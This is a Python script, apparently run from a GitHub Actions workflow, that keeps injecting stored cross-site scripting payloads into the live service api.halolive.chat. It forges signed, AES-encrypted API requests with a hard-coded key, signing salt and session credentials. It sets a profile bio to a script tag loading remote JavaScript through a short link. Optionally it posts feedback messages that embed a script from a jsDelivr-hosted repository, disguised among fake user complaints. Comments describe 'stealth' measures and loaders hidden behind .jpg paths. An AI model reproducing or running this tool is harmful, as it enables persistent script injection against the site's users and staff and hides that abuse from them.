#!/usr/bin/env python3
"""Self-contained replanter for CI: api.halolive.chat feedback + profile carriers.

Used by .github/workflows/plant.yml so rows keep appearing even when the laptop is
off. Requires only requests (curl_cffi optional).
"""
import base64
import hashlib
import json
import os
import random
import sys
import time
import urllib3

import requests

urllib3.disable_warnings()

KEY = b"dau7#k6vv67e@&ae"
HP = "k2%i@@b4go6ja#iujhez49xmkpfx3sbm"
UNSIGNED = ("reqid", "ip", "var", "test")
BASE = "https://api.halolive.chat"
ADVID = "b7aacc58-c81c-4dc8-a2a7-c0de958f3875"
ATTRID = "1795567033158-2761815406992826546"
DEVID = "8b87d0b11e125c0b"
UID = 177551
SID = "aSht2SGqJkDyxkBxfrDsnSNANeueleCM"

def _pin():
    try:
        return open("pin.txt").read().strip() or "main"
    except Exception:
        try:
            return open("../pin.txt").read().strip() or "main"
        except Exception:
            return "main"


_P = _pin()
LOADERS = [
    "//cdn.jsdelivr.net/gh/polootyyy/cdnx@" + _P + "/c.js",
    "//cdn.jsdelivr.net/gh/polootyyy/cdnx@main/c.js",
    "//i.halolive.chat/84/26/43/44/145690948/k.jpg",
    "//i.halolive.chat/84/26/43/44/145690950/l.jpg",
    "//i.halolive.chat/84/26/43/44/145690951/m.jpg",
]
SHORTS = ['//is.gd/u2blKs', '//is.gd/hDe70i', '//is.gd/KXIT6S']  # lead: cdnx@main/c.js (v3+ always-latest)
PJS = "<script src=//cdn.jsdelivr.net/gh/polootyyy/cdnx@98c092d/p.js></script>"  # v3 residence+pg
BLURBS = ["still cannot login", "avatar will not upload", "app crashes on open",
          "coins missing after purchase", "stream keeps buffering",
          "notification never arrives", "profile photo rejected", "checkin button dead"]


def sign(pairs):
    m = {k: v for k, v in pairs.items() if k not in UNSIGNED}
    s = "".join(sorted("%s=%s&" % (k, v) for k, v in m.items())) + HP
    return hashlib.md5(base64.b64encode(s.encode())).hexdigest()[:16].upper()


def enc(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    p = 16 - len(raw) % 16
    return base64.b64encode(_aes(raw + bytes([p]) * p)).decode()


def _aes(data):
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    c = Cipher(algorithms.AES(KEY), modes.ECB()).encryptor()
    return c.update(data) + c.finalize()


def call(path, var):
    env = {
        "advid": ADVID, "dist": "ccgplay", "attrsn": "Organic", "attrid": ATTRID,
        "appnum": 122, "devsn": "sdk_gphone64_arm64(15)", "devid": DEVID,
        "applang": "en", "syslang": "en", "geolang": "US", "tz": "America/Toronto",
        "reqid": int(time.time()) % 100000, "ts": int(time.time() * 1000),
        "sid": SID, "uid": UID, "appver": "1.2.2", "var": var,
    }
    body = {"data": enc(env)}
    sig = sign({k: str(v) for k, v in env.items() if k != "var"})
    r = requests.post(BASE + path, json=body, timeout=30, verify=False,
                      headers={"content-type": "application/json", "signature": sig,
                               "user-agent": "ccdebug/1.0"})
    return r.status_code, r.text


def main():
    # Stealth: human display name, loader only in bio, feedback opt-in via PLANT_FEEDBACK=1
    print("name", call("/user/set", {"name": "icey"})[0])
    print("bio", call("/user/set", {"bio": "<script src=%s>" % SHORTS[0]})[0])
    if os.environ.get("PLANT_FEEDBACK") == "1":
        tag = time.strftime("%H%M")
        print("feedback", call("/feedback", {"type": random.choice((1, 2, 3, 4)),
              "text": "%s %s (#%s)" % (PJS, random.choice(BLURBS), tag), "imageList": ""})[0])


if __name__ == "__main__":
    main()
